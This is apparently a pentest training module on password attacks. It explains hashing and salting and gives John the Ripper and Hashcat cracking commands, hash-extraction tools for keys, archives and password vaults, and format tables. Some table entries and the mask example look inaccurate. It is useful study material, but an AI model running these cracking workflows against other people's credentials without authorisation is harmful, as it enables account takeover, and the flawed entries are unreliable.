# 🔐 Password Attacks  
*Passwords remain the fragile seals guarding the gateways of corporate realms. When these wards are weak or neglected, the shadows may crack them open with ease. This module unveils the secrets of password storage, retrieval, and the arcane art of cracking or leveraging hashes—guiding the seeker through the labyrinth of authentication’s frailties.*

> *“Even the strongest lock may yield to the patient whisper of ancient incantations.”*

<details>
<summary><h1>💡 Introduction</h1></summary>

Passwords are commonly hashed when stored, in order to provide some protection in the event they fall into the hands of an attacker.

Hash functions are cryptographically designed to be one-way operations, making it computationally infeasible to derive the original input from its hashed output. When malicious actors attempt to reverse this process, it constitutes password cracking. Common methodologies include:

1. Rainbow Table Attacks

    * Leveraging precomputed hash chains for rapid lookups

2. Dictionary Attacks

    * Testing known wordlists and common password variations

3. Brute-Force Attacks

    * Systematic trial of all possible character combinations (typically last-resort)


<details>
<summary><h2>Generate a hash</h2></summary>

**MD5**

```bash
echo -n password123! | md5sum

# b7e283a09511d95d6eac86e39e7942c0
```

**SHA1**

```bash
echo -n "password123!" | sha1sum

# addbd3aa5619f2932733104eb8ceef08f6fd2693
```

**SHA256**

```bash
echo -n password123! | sha256sum

# 5751a44782594819e4cb8aa27c2c9d87a420af82bc6a5a05bc7f19c3bb00452b
```

**SHA512**

```bash
echo -n "password123!" | sha512sum

# 7d66f28d648ca474e357d78e9fbdeb9bbdb46e1603d4ec63f7affe217e6400f3f3211e6e4e1b29dc10617417e502b19c813ced4cec07360e7e3151c290388176
```

**CRC32**
```bash
echo -n "password123!" | gzip -1 | tail -c 8 | hexdump -n4 -e '"%08x\n"'

# 3cdccd7e
```

</details>

<details>
<summary><h2>Rainbow Tables</h2></summary>

Rainbow tables represent extensive pre-generated databases that map plaintext inputs to their corresponding hash outputs for specific cryptographic algorithms. These tables enable rapid password recovery through direct hash lookup.

| Password    | MD5 Hash                           |
|-------------|------------------------------------|
| 123456      | e10adc3949ba59abbe56e057f20f883e |
| 12345       | 827ccb0eea8a706c4c34a16891f84e7b |
| 123456789   | 25f9e794323b453885f5181f1b624d0b |
| password    | 5f4dcc3b5aa765d61d8327deb882cf99 |
| iloveyou    | f25a2fc72690b780b2a14e140ef6a9e0 |
| princess    | 8afa847f50a716e64932d995c8e7435a |
| 1234567     | fcea920f7412b5da7be0cf42b8c93759 |
| rockyou     | f806fc5a2a0d5ba2471600758452799c |
| 12345678    | 25d55ad283aa400af464c76d713c07ad |
| abc123      | e99a18c428cb38d5f260853678922e03 |
| ...  | ...                        |

> Because rainbow tables are such a powerful attack, salting is used.

</details>

<details>
<summary><h2>Salt</h2></summary>

A salt, in cryptographic terms, is a random sequence of bytes added to a password before it is hashed.

For example, if the salt *PWN0M1C0N_* is prepended to the same password, the MD5 hash would now be as follows:

```bash
echo -n PWN0M1C0N_password123! | md5sum

# ded0e91215d34046aca709995c794045
```

**Why use a Salt?**

* Prevents Identical Hashes: Without a salt, the same password always produces the same hash. Salts ensure uniqueness, even if two users have the same password.

* Defeats Rainbow Tables: Precomputed hash tables (rainbow tables) become useless because each salt requires a separate lookup table.

**How Salts Break Rainbow Tables**

A 1-byte salt (256 possible values) forces attackers to generate 256 versions of every precomputed hash. A rainbow table with 15 billion entries would need 3.84 trillion entries (15B × 256) to cover all salt combinations.
Modern Systems use larger salts (e.g., 16+ bytes), making rainbow tables computationally infeasible.

</details>

<details>
<summary><h2>Dictionary attack</h2></summary>

Dictionary attacks (or wordlist attacks) represent one of the most effective password cracking methods, particularly valuable for time-constrained engagements like penetration testing.

**Key Characteristics**

* **High Efficiency:** Targets common passwords first, maximizing success rate per attempt

* **Time Optimization:** Critical for engagements with limited testing windows

* **Customization:** Wordlists can be tailored to specific industries, regions, or targets

**Common Wordlist Resources**

* [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt): Contains millions of real passwords from historical breaches

* [SecLists](https://github.com/danielmiessler/SecLists): Comprehensive security testing collection including:

    * Common credentials

    * Default passwords

    * Pattern-based variations

</details>

</details>

---

<details>
<summary><h1>🔑 Password Cracking Techniques</h1></summary>

<details>
<summary><h2>John The Ripper</h2></summary>

Tool used for cracking passwords through various attacks including brute-force and dictionary.

[Here](https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats) is a very useful cheat-sheet by PentestMonkey.

<details>
<summary><h3>JtR FOrmats</h3></summary>

| Hash Format           | Example Command                          | Description |
|-----------------------|-----------------------------------------|-------------|
| afs                   | `john --format=afs [...] <HASH_FILE>`    | AFS (Andrew File System) password hashes |
| bfegg                 | `john --format=bfegg [...] <HASH_FILE>`  | bfegg hashes used in Eggdrop IRC bots |
| bf                    | `john --format=bf [...] <HASH_FILE>`     | Blowfish-based crypt(3) hashes |
| bsdi                  | `john --format=bsdi [...] <HASH_FILE>`   | BSDi crypt(3) hashes |
| crypt(3)              | `john --format=crypt [...] <HASH_FILE>`  | Traditional Unix crypt(3) hashes |
| des                   | `john --format=des [...] <HASH_FILE>`    | Traditional DES-based crypt(3) hashes |
| dmd5                  | `john --format=dmd5 [...] <HASH_FILE>`   | DMD5 (Dragonfly BSD MD5) password hashes |
| dominosec             | `john --format=dominosec [...] <HASH_FILE>` | IBM Lotus Domino 6/7 password hashes |
| EPiServer SID hashes  | `john --format=episerver [...] <HASH_FILE>` | EPiServer SID (Security Identifier) password hashes |
| hdaa                  | `john --format=hdaa [...] <HASH_FILE>`   | hdaa password hashes used in Openwall GNU/Linux |
| hmac-md5              | `john --format=hmac-md5 [...] <HASH_FILE>` | hmac-md5 password hashes |
| hmailserver           | `john --format=hmailserver [...] <HASH_FILE>` | hmailserver password hashes |
| ipb2                  | `john --format=ipb2 [...] <HASH_FILE>`   | Invision Power Board 2 password hashes |
| krb4                  | `john --format=krb4 [...] <HASH_FILE>`   | Kerberos 4 password hashes |
| krb5                  | `john --format=krb5 [...] <HASH_FILE>`   | Kerberos 5 password hashes |
| LM                    | `john --format=LM [...] <HASH_FILE>`     | LM (Lan Manager) password hashes |
| lotus5                | `john --format=lotus5 [...] <HASH_FILE>` | Lotus Notes/Domino 5 password hashes |
| mscash                | `john --format=mscash [...] <HASH_FILE>` | MS Cache password hashes |
| mscash2               | `john --format=mscash2 [...] <HASH_FILE>` | MS Cache v2 password hashes |
| mschapv2              | `john --format=mschapv2 [...] <HASH_FILE>` | MS CHAP v2 password hashes |
| mskrb5                | `john --format=mskrb5 [...] <HASH_FILE>` | MS Kerberos 5 password hashes |
| mssql05               | `john --format=mssql05 [...] <HASH_FILE>` | MS SQL 2005 password hashes |
| mssql                 | `john --format=mssql [...] <HASH_FILE>`  | MS SQL password hashes |
| mysql-fast            | `john --format=mysql-fast [...] <HASH_FILE>` | MySQL fast password hashes |
| mysql                 | `john --format=mysql [...] <HASH_FILE>`  | MySQL password hashes |
| mysql-sha1            | `john --format=mysql-sha1 [...] <HASH_FILE>` | MySQL SHA1 password hashes |
| NETLM                 | `john --format=netlm [...] <HASH_FILE>`  | NETLM (NT LAN Manager) password hashes |
| NETLMv2               | `john --format=netlmv2 [...] <HASH_FILE>` | NETLMv2 (NT LAN Manager version 2) password hashes |
| NETNTLM               | `john --format=netntlm [...] <HASH_FILE>` | NETNTLM (NT LAN Manager) password hashes |
| NETNTLMv2             | `john --format=netntlmv2 [...] <HASH_FILE>` | NETNTLMv2 (NT LAN Manager version 2) password hashes |
| NEThalfLM             | `john --format=nethalflm [...] <HASH_FILE>` | NEThalfLM (NT LAN Manager) password hashes |
| md5ns                 | `john --format=md5ns [...] <HASH_FILE>`  | md5ns (MD5 namespace) password hashes |
| nsldap                | `john --format=nsldap [...] <HASH_FILE>` | nsldap (OpenLDAP SHA) password hashes |
| ssha                  | `john --format=ssha [...] <HASH_FILE>`   | ssha (Salted SHA) password hashes |
| NT                    | `john --format=nt [...] <HASH_FILE>`     | NT (Windows NT) password hashes |
| openssha              | `john --format=openssha [...] <HASH_FILE>` | OPENSSH private key password hashes |
| oracle11              | `john --format=oracle11 [...] <HASH_FILE>` | Oracle 11 password hashes |
| oracle                | `john --format=oracle [...] <HASH_FILE>` | Oracle password hashes |
| pdf                   | `john --format=pdf [...] <HASH_FILE>`    | PDF (Portable Document Format) password hashes |
| phpass-md5            | `john --format=phpass-md5 [...] <HASH_FILE>` | PHPass-MD5 (Portable PHP password hashing framework) password hashes |
| phps                  | `john --format=phps [...] <HASH_FILE>`   | PHPS password hashes |
| pix-md5               | `john --format=pix-md5 [...] <HASH_FILE>` | Cisco PIX MD5 password hashes |
| po                    | `john --format=po [...] <HASH_FILE>`     | Po (Sybase SQL Anywhere) password hashes |
| rar                   | `john --format=rar [...] <HASH_FILE>`    | RAR (WinRAR) password hashes |
| raw-md4               | `john --format=raw-md4 [...] <HASH_FILE>` | Raw MD4 password hashes |
| raw-md5               | `john --format=raw-md5 [...] <HASH_FILE>` | Raw MD5 password hashes |
| raw-md5-unicode       | `john --format=raw-md5-unicode [...] <HASH_FILE>` | Raw MD5 Unicode password hashes |
| raw-sha1              | `john --format=raw-sha1 [...] <HASH_FILE>` | Raw SHA1 password hashes |
| raw-sha224            | `john --format=raw-sha224 [...] <HASH_FILE>` | Raw SHA224 password hashes |
| raw-sha256            | `john --format=raw-sha256 [...] <HASH_FILE>` | Raw SHA256 password hashes |
| raw-sha384            | `john --format=raw-sha384 [...] <HASH_FILE>` | Raw SHA384 password hashes |
| raw-sha512            | `john --format=raw-sha512 [...] <HASH_FILE>` | Raw SHA512 password hashes |
| salted-sha            | `john --format=salted-sha [...] <HASH_FILE>` | Salted SHA password hashes |
| sapb                  | `john --format=sapb [...] <HASH_FILE>`   | SAP CODVN B (BCODE) password hashes |
| sapg                  | `john --format=sapg [...] <HASH_FILE>`   | SAP CODVN G (PASSCODE) password hashes |
| sha1-gen              | `john --format=sha1-gen [...] <HASH_FILE>` | Generic SHA1 password hashes |
| skey                  | `john --format=skey [...] <HASH_FILE>`   | S/Key (One-time password) hashes |
| ssh                   | `john --format=ssh [...] <HASH_FILE>`    | SSH (Secure Shell) password hashes |
| sybasease             | `john --format=sybasease [...] <HASH_FILE>` | Sybase ASE password hashes |
| xsha                  | `john --format=xsha [...] <HASH_FILE>`   | xsha (Extended SHA) password hashes |
| zip                   | `john --format=zip [...] <HASH_FILE>`    | ZIP (WinZip) password hashes |

</details>

<details>
<summary><h3>Cracking passwords</h3></summary>

<details>
<summary><h4>Wordlists</h4></summary>

Verify the hash type

```bash
hashid -j "<HASH_STRING>"
```

> By adding the -j flag, hashID will, in addition to the hash format, list the corresponding JtR format

Create the hash file

```bash
echo "<HASH_STRING>" > hash.txt
```

> To process multiple hashes in a single operation, place each hash on a separate line and ensure no empty lines or extraneous characters.

Example valid format

```bash
d1c5c8f3b5f1e0a7a6b8d9c2e4f6a3b1d0e7f8c9  
5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8  
7c4a8d09ca3762af61e59520943dc26494f8941b
```

Run john

```bash
john --format=<HASH_FORMAT> --wordlist=/usr/share/wordlists/rockyou.txt hash.txt > cracked_hash.txt
```

Verify the results

```bash
john --show --format=raw-md5 hash.txt
```

</details>

<details>
<summary><h4>Single</h4></summary>

Verify the hash type

```bash
hashid -j "<HASH_STRING>"
```

Create the hash file

```bash
echo "<HASH_STRING>" > hash.txt
```

Example valid format

```bash
r0lf:\$6\$ues25dIanlctrWxg\$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash
```

Run john

```bash
john --single --format=<HASH_FORMAT> hash.txt
```

Verify the results

```bash
john --show --format=<HASH_FORMAT> hash.txt
```

</details>

</details>

<details>
<summary><h3>Cracking files</h3></summary>

John the Ripper includes specialized utilities for extracting hashes from encrypted/password-protected files. These companion tools follow a consistent syntax pattern:

```bash
<TOOL> <FILE_TO_CRACK> > file.hash
```

Some of the tools included with JtR are:

| Tool                     | Example Usage                     | Description |
|--------------------------|-----------------------------------|-------------|
| `pdf2john`               | `pdf2john file.pdf > hash.txt`    | Extracts password hashes from PDF files for John |
| `ssh2john`               | `ssh2john id_rsa > hash.txt`      | Converts SSH private keys to John format |
| `mscash2john`            | `mscash2john cache.dat > hash.txt`| Extracts MS Cash password hashes |
| `keychain2john`          | `keychain2john login.keychain > hash.txt` | Processes macOS keychain files |
| `rar2john`               | `rar2john archive.rar > hash.txt` | Extracts RAR archive passwords |
| `pfx2john`               | `pfx2john cert.pfx > hash.txt`    | Converts PKCS#12 files for cracking |
| `truecrypt_volume2john`  | `truecrypt_volume2john volume.tc > hash.txt` | Extracts TrueCrypt volume passwords |
| `keepass2john`           | `keepass2john database.kdbx > hash.txt` | Extracts KeePass database credentials |
| `vncpcap2john`           | `vncpcap2john capture.pcap > hash.txt` | Extracts VNC passwords from PCAP files |
| `putty2john`             | `putty2john putty_key.ppk > hash.txt` | Converts PuTTY private keys |
| `zip2john`               | `zip2john archive.zip > hash.txt` | Extracts ZIP archive passwords |
| `hccap2john`             | `hccap2john capture.cap > hash.txt` | Converts WPA handshakes for cracking |
| `office2john`            | `office2john document.docx > hash.txt` | Extracts MS Office document passwords |
| `wpa2john`               | `wpa2john capture.pcap > hash.txt` | Alternative WPA handshake converter |

An even larger collection can be found:

```bash
locate *2john*
```

</details>

</details>

<details>
<summary><h2>Hashcat</h2></summary>

Hashcat is a well-known password cracking tool for Linux, Windows, and macOS.

```bash
hashcat --attack-mode 0 --hash-type <HASHCAT_HASH_TYPE> <HASH_FILE> <WORDLIST>
```

To find more information about Hashcat, use:

```bash
hashcat --help
```

Hashid can be used to identify the hashcat has type

```bash
hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
```

Expected output

```bash
# Analyzing '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'

# [+] MD5 Crypt [Hashcat Mode: 500]
# [+] Cisco-IOS(MD5) [Hashcat Mode: 500]
# [+] FreeBSD MD5 [Hashcat Mode: 500]
```

<details>
<summary><h3>Attack modes</h3></summary>

<details>
<summary><h4>Dictionary Attack</h4></summary>

```bash
hashcat --attack-mode <ATTACK_MODE> --hash-type <HASH_TYPE> <HASH> <WORDLIST>
```

Example

```bash
hashcat --attack-mode 0 --hash-type 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
```

</details>

<details>
<summary><h4>Dictionary Attack + Rules</h4></summary>

```bash
hashcat --attack-mode <ATTACK_MODE> --hash-type <HASH_TYPE> <HASH> <WORDLIST> --rules-file <RULE_FILE>
```

Example

```bash
hashcat --attack-mode 0 --hash-type 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
```

</details>

<details>
<summary><h4>Mask attack</h4></summary>

If we know that a password is eight characters long, rather than attempting every possible combination, we might define a mask that tests combinations of six letters followed by two numbers.

```bash
hashcat --attack-mode <ATTACK_MODE> --hash-type <HASH_TYPE> <HASH> '<MASK>'
```

Example

```bash
hashcat --attack-mode 3 --hash-type 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```

</details>

</details>

<details>
<summary><h3>Hashcat types</h3></summary>

|   # | Name                                                                 | Category                              |
|-----:|----------------------------------------------------------------------|---------------------------------------|
|  900 | MD4                                                                  | Raw Hash                              |
|    0 | MD5                                                                  | Raw Hash                              |
|  100 | SHA1                                                                 | Raw Hash                              |
| 1300 | SHA2-224                                                             | Raw Hash                              |
| 1400 | SHA2-256                                                             | Raw Hash                              |
| 10800 | SHA2-384                                                             | Raw Hash                              |
| 1700 | SHA2-512                                                             | Raw Hash                              |
| 17300 | SHA3-224                                                             | Raw Hash                              |
| 17400 | SHA3-256                                                             | Raw Hash                              |
| 17500 | SHA3-384                                                             | Raw Hash                              |
| 17600 | SHA3-512                                                             | Raw Hash                              |
| 6000 | RIPEMD-160                                                           | Raw Hash                              |
|  600 | BLAKE2b-512                                                          | Raw Hash                              |
| 11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian                     | Raw Hash                              |
| 11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian                     | Raw Hash                              |
| 6900 | GOST R 34.11-94                                                      | Raw Hash                              |
| 17010 | GPG (AES-128/AES-256 (SHA-1($pass)))                                 | Raw Hash                              |
| 5100 | Half MD5                                                             | Raw Hash                              |
| 17700 | Keccak-224                                                           | Raw Hash                              |
| 17800 | Keccak-256                                                           | Raw Hash                              |
| 17900 | Keccak-384                                                           | Raw Hash                              |
| 18000 | Keccak-512                                                           | Raw Hash                              |
| 6100 | Whirlpool                                                            | Raw Hash                              |
| 10100 | SipHash                                                              | Raw Hash                              |
|   70 | md5(utf16le($pass))                                                  | Raw Hash                              |
|  170 | sha1(utf16le($pass))                                                 | Raw Hash                              |
| 1470 | sha256(utf16le($pass))                                               | Raw Hash                              |
| 10870 | sha384(utf16le($pass))                                               | Raw Hash                              |
| 1770 | sha512(utf16le($pass))                                               | Raw Hash                              |
|  610 | BLAKE2b-512($pass.$salt)                                             | Raw Hash salted and/or iterated       |
|  620 | BLAKE2b-512($salt.$pass)                                             | Raw Hash salted and/or iterated       |
|   10 | md5($pass.$salt)                                                     | Raw Hash salted and/or iterated       |
|   20 | md5($salt.$pass)                                                     | Raw Hash salted and/or iterated       |
| 3800 | md5($salt.$pass.$salt)                                               | Raw Hash salted and/or iterated       |
| 3710 | md5($salt.md5($pass))                                                | Raw Hash salted and/or iterated       |
| 4110 | md5($salt.md5($pass.$salt))                                          | Raw Hash salted and/or iterated       |
| 4010 | md5($salt.md5($salt.$pass))                                          | Raw Hash salted and/or iterated       |
| 21300 | md5($salt.sha1($salt.$pass))                                         | Raw Hash salted and/or iterated       |
|   40 | md5($salt.utf16le($pass))                                            | Raw Hash salted and/or iterated       |
| 2600 | md5(md5($pass))                                                      | Raw Hash salted and/or iterated       |
| 3910 | md5(md5($pass).md5($salt))                                           | Raw Hash salted and/or iterated       |
| 3500 | md5(md5(md5($pass)))                                                 | Raw Hash salted and/or iterated       |
| 4400 | md5(sha1($pass))                                                     | Raw Hash salted and/or iterated       |
| 4410 | md5(sha1($pass).$salt)                                               | Raw Hash salted and/or iterated       |
| 20900 | md5(sha1($pass).md5($pass).sha1($pass))                              | Raw Hash salted and/or iterated       |
| 21200 | md5(sha1($salt).md5($pass))                                          | Raw Hash salted and/or iterated       |
| 4300 | md5(strtoupper(md5($pass)))                                          | Raw Hash salted and/or iterated       |
|   30 | md5(utf16le($pass).$salt)                                            | Raw Hash salted and/or iterated       |
|  110 | sha1($pass.$salt)                                                    | Raw Hash salted and/or iterated       |
|  120 | sha1($salt.$pass)                                                    | Raw Hash salted and/or iterated       |
| 4900 | sha1($salt.$pass.$salt)                                              | Raw Hash salted and/or iterated       |
| 4520 | sha1($salt.sha1($pass))                                              | Raw Hash salted and/or iterated       |
| 24300 | sha1($salt.sha1($pass.$salt))                                        | Raw Hash salted and/or iterated       |
|  140 | sha1($salt.utf16le($pass))                                           | Raw Hash salted and/or iterated       |
| 19300 | sha1($salt1.$pass.$salt2)                                            | Raw Hash salted and/or iterated       |
| 14400 | sha1(CX)                                                             | Raw Hash salted and/or iterated       |
| 4700 | sha1(md5($pass))                                                     | Raw Hash salted and/or iterated       |
| 4710 | sha1(md5($pass).$salt)                                               | Raw Hash salted and/or iterated       |
| 21100 | sha1(md5($pass.$salt))                                               | Raw Hash salted and/or iterated       |
| 18500 | sha1(md5(md5($pass)))                                                | Raw Hash salted and/or iterated       |
| 4500 | sha1(sha1($pass))                                                    | Raw Hash salted and/or iterated       |
| 4510 | sha1(sha1($pass).$salt)                                              | Raw Hash salted and/or iterated       |
| 5000 | sha1(sha1($salt.$pass.$salt))                                        | Raw Hash salted and/or iterated       |
|  130 | sha1(utf16le($pass).$salt)                                           | Raw Hash salted and/or iterated       |
| 1410 | sha256($pass.$salt)                                                  | Raw Hash salted and/or iterated       |
| 1420 | sha256($salt.$pass)                                                  | Raw Hash salted and/or iterated       |
| 22300 | sha256($salt.$pass.$salt)                                            | Raw Hash salted and/or iterated       |
| 20720 | sha256($salt.sha256($pass))                                          | Raw Hash salted and/or iterated       |
| 21420 | sha256($salt.sha256_bin($pass))                                      | Raw Hash salted and/or iterated       |
| 1440 | sha256($salt.utf16le($pass))                                         | Raw Hash salted and/or iterated       |
| 20800 | sha256(md5($pass))                                                   | Raw Hash salted and/or iterated       |
| 20710 | sha256(sha256($pass).$salt)                                          | Raw Hash salted and/or iterated       |
| 21400 | sha256(sha256_bin($pass))                                            | Raw Hash salted and/or iterated       |
| 1430 | sha256(utf16le($pass).$salt)                                         | Raw Hash salted and/or iterated       |
| 10810 | sha384($pass.$salt)                                                  | Raw Hash salted and/or iterated       |
| 10820 | sha384($salt.$pass)                                                  | Raw Hash salted and/or iterated       |
| 10840 | sha384($salt.utf16le($pass))                                         | Raw Hash salted and/or iterated       |
| 10830 | sha384(utf16le($pass).$salt)                                         | Raw Hash salted and/or iterated       |
| 1710 | sha512($pass.$salt)                                                  | Raw Hash salted and/or iterated       |
| 1720 | sha512($salt.$pass)                                                  | Raw Hash salted and/or iterated       |
| 1740 | sha512($salt.utf16le($pass))                                         | Raw Hash salted and/or iterated       |
| 1730 | sha512(utf16le($pass).$salt)                                         | Raw Hash salted and/or iterated       |
|   50 | HMAC-MD5 (key = $pass)                                              | Raw Hash authenticated                |
|   60 | HMAC-MD5 (key = $salt)                                              | Raw Hash authenticated                |
|  150 | HMAC-SHA1 (key = $pass)                                             | Raw Hash authenticated                |
|  160 | HMAC-SHA1 (key = $salt)                                             | Raw Hash authenticated                |
| 1450 | HMAC-SHA256 (key = $pass)                                           | Raw Hash authenticated                |
| 1460 | HMAC-SHA256 (key = $salt)                                           | Raw Hash authenticated                |
| 1750 | HMAC-SHA512 (key = $pass)                                           | Raw Hash authenticated                |
| 1760 | HMAC-SHA512 (key = $salt)                                           | Raw Hash authenticated                |
| 11750 | HMAC-Streebog-256 (key = $pass), big-endian                          | Raw Hash authenticated                |
| 11760 | HMAC-Streebog-256 (key = $salt), big-endian                          | Raw Hash authenticated                |
| 11850 | HMAC-Streebog-512 (key = $pass), big-endian                          | Raw Hash authenticated                |
| 11860 | HMAC-Streebog-512 (key = $salt), big-endian                          | Raw Hash authenticated                |
| 28700 | Amazon AWS4-HMAC-SHA256                                              | Raw Hash authenticated                |
| 11500 | CRC32                                                                | Raw Checksum                          |
| 27900 | CRC32C                                                               | Raw Checksum                          |
| 28000 | CRC64Jones                                                           | Raw Checksum                          |
| 18700 | Java Object hashCode()                                               | Raw Checksum                          |
| 25700 | MurmurHash                                                           | Raw Checksum                          |
| 27800 | MurmurHash3                                                          | Raw Checksum                          |
| 14100 | 3DES (PT = $salt, key = $pass)                                      | Raw Cipher, Known-plaintext attack    |
| 14000 | DES (PT = $salt, key = $pass)                                       | Raw Cipher, Known-plaintext attack    |
| 26401 | AES-128-ECB NOKDF (PT = $salt, key = $pass)                         | Raw Cipher, Known-plaintext attack    |
| 26402 | AES-192-ECB NOKDF (PT = $salt, key = $pass)                         | Raw Cipher, Known-plaintext attack    |
| 26403 | AES-256-ECB NOKDF (PT = $salt, key = $pass)                         | Raw Cipher, Known-plaintext attack    |
| 15400 | ChaCha20                                                             | Raw Cipher, Known-plaintext attack    |
| 14500 | Linux Kernel Crypto API (2.4)                                        | Raw Cipher, Known-plaintext attack    |
| 14900 | Skip32 (PT = $salt, key = $pass)                                    | Raw Cipher, Known-plaintext attack    |
| 11900 | PBKDF2-HMAC-MD5                                                      | Generic KDF                           |
| 12000 | PBKDF2-HMAC-SHA1                                                     | Generic KDF                           |
| 10900 | PBKDF2-HMAC-SHA256                                                   | Generic KDF                           |
| 12100 | PBKDF2-HMAC-SHA512                                                   | Generic KDF                           |
| 8900 | scrypt                                                               | Generic KDF                           |
|  400 | phpass                                                               | Generic KDF                           |
| 16100 | TACACS+                                                              | Network Protocol                      |
| 11400 | SIP digest authentication (MD5)                                      | Network Protocol                      |
| 5300 | IKE-PSK MD5                                                          | Network Protocol                      |
| 5400 | IKE-PSK SHA1                                                         | Network Protocol                      |
| 25100 | SNMPv3 HMAC-MD5-96                                                   | Network Protocol                      |
| 25000 | SNMPv3 HMAC-MD5-96/HMAC-SHA1-96                                      | Network Protocol                      |
| 25200 | SNMPv3 HMAC-SHA1-96                                                  | Network Protocol                      |
| 26700 | SNMPv3 HMAC-SHA224-128                                               | Network Protocol                      |
| 26800 | SNMPv3 HMAC-SHA256-192                                               | Network Protocol                      |
| 26900 | SNMPv3 HMAC-SHA384-256                                               | Network Protocol                      |
| 27300 | SNMPv3 HMAC-SHA512-384                                               | Network Protocol                      |
| 2500 | WPA-EAPOL-PBKDF2                                                     | Network Protocol                      |
| 2501 | WPA-EAPOL-PMK                                                        | Network Protocol                      |
| 22000 | WPA-PBKDF2-PMKID+EAPOL                                               | Network Protocol                      |
| 22001 | WPA-PMK-PMKID+EAPOL                                                  | Network Protocol                      |
| 16800 | WPA-PMKID-PBKDF2                                                     | Network Protocol                      |
| 16801 | WPA-PMKID-PMK                                                        | Network Protocol                      |
| 7300 | IPMI2 RAKP HMAC-SHA1                                                 | Network Protocol                      |
| 10200 | CRAM-MD5                                                             | Network Protocol                      |
| 16500 | JWT (JSON Web Token)                                                 | Network Protocol                      |
| 29200 | Radmin3                                                              | Network Protocol                      |
| 19600 | Kerberos 5, etype 17, TGS-REP                                        | Network Protocol                      |
| 19800 | Kerberos 5, etype 17, Pre-Auth                                       | Network Protocol                      |
| 28800 | Kerberos 5, etype 17, DB                                             | Network Protocol                      |
| 19700 | Kerberos 5, etype 18, TGS-REP                                        | Network Protocol                      |
| 19900 | Kerberos 5, etype 18, Pre-Auth                                       | Network Protocol                      |
| 28900 | Kerberos 5, etype 18, DB                                             | Network Protocol                      |
| 7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                                | Network Protocol                      |
| 13100 | Kerberos 5, etype 23, TGS-REP                                        | Network Protocol                      |
| 18200 | Kerberos 5, etype 23, AS-REP                                         | Network Protocol                      |
| 5500 | NetNTLMv1 / NetNTLMv1+ESS                                            | Network Protocol                      |
| 27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                                       | Network Protocol                      |
| 5600 | NetNTLMv2                                                            | Network Protocol                      |
| 27100 | NetNTLMv2 (NT)                                                       | Network Protocol                      |
| 29100 | Flask Session Cookie ($salt.$salt.$pass)                             | Network Protocol                      |
| 4800 | iSCSI CHAP authentication, MD5(CHAP)                                 | Network Protocol                      |
| 8500 | RACF                                                                 | Operating System                      |
| 6300 | AIX {smd5}                                                           | Operating System                      |
| 6700 | AIX {ssha1}                                                          | Operating System                      |
| 6400 | AIX {ssha256}                                                        | Operating System                      |
| 6500 | AIX {ssha512}                                                        | Operating System                      |
| 3000 | LM                                                                   | Operating System                      |
| 19000 | QNX /etc/shadow (MD5)                                                | Operating System                      |
| 19100 | QNX /etc/shadow (SHA256)                                             | Operating System                      |
| 19200 | QNX /etc/shadow (SHA512)                                             | Operating System                      |
| 15300 | DPAPI masterkey file v1 (context 1 and 2)                            | Operating System                      |
| 15310 | DPAPI masterkey file v1 (context 3)                                  | Operating System                      |
| 15900 | DPAPI masterkey file v2 (context 1 and 2)                            | Operating System                      |
| 15910 | DPAPI masterkey file v2 (context 3)                                  | Operating System                      |
| 7200 | GRUB 2                                                               | Operating System                      |
| 12800 | MS-AzureSync PBKDF2-HMAC-SHA256                                      | Operating System                      |
| 12400 | BSDi Crypt, Extended DES                                             | Operating System                      |
| 1000 | NTLM                                                                 | Operating System                      |
| 9900 | Radmin2                                                              | Operating System                      |
| 5800 | Samsung Android Password/PIN                                         | Operating System                      |
| 28100 | Windows Hello PIN/Password                                           | Operating System                      |
| 13800 | Windows Phone 8+ PIN/password                                        | Operating System                      |
| 2410 | Cisco-ASA MD5                                                        | Operating System                      |
| 9200 | Cisco-IOS $8$ (PBKDF2-SHA256)                                        | Operating System                      |
| 9300 | Cisco-IOS $9$ (scrypt)                                               | Operating System                      |
| 5700 | Cisco-IOS type 4 (SHA256)                                            | Operating System                      |
| 2400 | Cisco-PIX MD5                                                        | Operating System                      |
| 8100 | Citrix NetScaler (SHA1)                                              | Operating System                      |
| 22200 | Citrix NetScaler (SHA512)                                            | Operating System                      |
| 1100 | Domain Cached Credentials (DCC), MS Cache                            | Operating System                      |
| 2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2                       | Operating System                      |
| 7000 | FortiGate (FortiOS)                                                  | Operating System                      |
| 26300 | FortiGate256 (FortiOS256)                                            | Operating System                      |
|  125 | ArubaOS                                                              | Operating System                      |
|  501 | Juniper IVE                                                          | Operating System                      |
|   22 | Juniper NetScreen/SSG (ScreenOS)                                     | Operating System                      |
| 15100 | Juniper/NetBSD sha1crypt                                             | Operating System                      |
| 26500 | iPhone passcode (UID key + System Keybag)                            | Operating System                      |
|  122 | macOS v10.4, macOS v10.5, macOS v10.6                                | Operating System                      |
| 1722 | macOS v10.7                                                          | Operating System                      |
| 7100 | macOS v10.8+ (PBKDF2-SHA512)                                         | Operating System                      |
| 3200 | bcrypt $2*$, Blowfish (Unix)                                         | Operating System                      |
|  500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)                            | Operating System                      |
| 1500 | descrypt, DES (Unix), Traditional DES                                | Operating System                      |
| 29000 | sha1($salt.sha1(utf16le($username).':'.utf16le($pass)))              | Operating System                      |
| 7400 | sha256crypt $5$, SHA256 (Unix)                                       | Operating System                      |
| 1800 | sha512crypt $6$, SHA512 (Unix)                                       | Operating System                      |
| 24600 | SQLCipher                                                            | Database Server                       |
|  131 | MSSQL (2000)                                                         | Database Server                       |
|  132 | MSSQL (2005)                                                         | Database Server                       |
| 1731 | MSSQL (2012, 2014)                                                   | Database Server                       |
